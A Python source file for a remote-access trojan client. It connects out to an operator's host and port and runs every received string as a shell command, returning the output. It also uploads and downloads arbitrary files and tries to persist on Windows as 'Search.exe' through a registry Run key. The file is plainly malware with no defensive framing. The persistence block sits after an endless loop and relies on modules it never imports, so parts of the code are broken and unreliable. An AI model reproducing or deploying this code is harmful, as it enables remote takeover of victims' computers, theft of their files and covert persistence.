BUFF_SIZE=4096 #4KB
import socket,subprocess,os
from ipPort import *
import pyautogui
colors = {'HEADER' : "\033[95m",
    'OKBLUE' : "\033[94m",
    'RED' : "\033[91m",
    'YELLOW' : "\033[93m",
    'GREEN' : "\033[92m",
    'LIGHTBLUE' : "\033[96m",
    'FAIL' : "\033[91m",
    'END' : "\033[0m",
    'BOLD' : "\033[1m",
    'UNDERLINE' : "\033[4m" }
while True:
    try:
        s=socket.socket();gamer=str(f);port=str(f1);s.connect((str(gamer),int(port)))
        while(1):
            veri=b''
            while True:
                veri_parcasi=s.recv(BUFF_SIZE)
                veri+=veri_parcasi
                if(b'FILENAME=' in veri_parcasi):
                    file_data=veri_parcasi.split(b"=")
                    file_data=str(str(file_data[1]).split("b'")[1].split("'")[0])
                if len(veri_parcasi) < BUFF_SIZE:
                    break
            if veri[:4]==b'exit':
                pyautogui.press('Control','c')
                    
            if veri[:2].decode("utf-8")=="cd":
                os.chdir(veri[3:].decode("utf-8"))
            if veri[:6]==b'upload':
                data=veri[6:]
                with open(file_data,"wb") as wb_F:
                    wb_F.write(data)
                
            if veri[:8]==b'download':
                with open(file_data,"rb") as rb_F:
                    rb_F=rb_F.read()
                s.send(bytes(rb_F))
            if len(veri)>0 and veri[:6]!=b'upload':
                com=subprocess.Popen(veri[:].decode("utf-8"),shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                obyte=com.stdout.read()+com.stderr.read()
                ostring=str(obyte,"utf-8")
                dir_=os.getcwd()


                if(veri[:2].decode("utf-8")=="cd"):
                    s.send(str.encode("Current Directory:"+dir_))
                if(veri[:2].decode("utf-8")!="cd"):
                    s.send(str.encode(ostring))
            
    except:
        pass
try:
    p=os.environ["appveri"]+"\\Search.exe"
    if not os.path.exists(p):
        shutil.copyfile(sys.executable,p)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v search /t REG_SZ /d "'+p+'"',shell=True)
except:
    pass
